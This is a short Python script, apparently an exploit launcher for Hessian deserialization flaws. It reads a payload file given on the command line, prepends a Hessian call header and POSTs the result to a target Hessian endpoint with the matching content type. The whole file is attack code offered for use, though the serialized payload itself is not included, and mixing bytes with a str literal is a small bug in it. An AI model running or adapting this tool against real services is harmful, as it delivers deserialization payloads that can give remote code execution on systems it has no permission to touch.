#!/usr/bin/env python
# coding=utf-8
# code by 21superman
# Date 2018年12月28日
import requests
import argparse

def load(name):
    header=b'\x63\x02\x00\x48\x00\x04'+'test'
    with open(name,'rb') as f:
        return header+f.read()

def send(url,payload):
    #proxies = {'http':'127.0.0.1:8888'}
    headers={'Content-Type':'x-application/hessian'}
    data=payload
    res=requests.post(url,headers=headers,data=data)
    return res.text

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", help="hessian site url eg.http://127.0.0.1:8080/HessianTest/hessian")
    parser.add_argument("-p",help="payload file")
    args = parser.parse_args()
    if args.u==None or args.p==None:
        print('eg. python hessian.py -u http://127.0.0.1:8080/HessianTest/hessian -p hessian')
    else:
        send(args.u, load(args.p))
if __name__ == '__main__':
    main()
    #load('hessian')

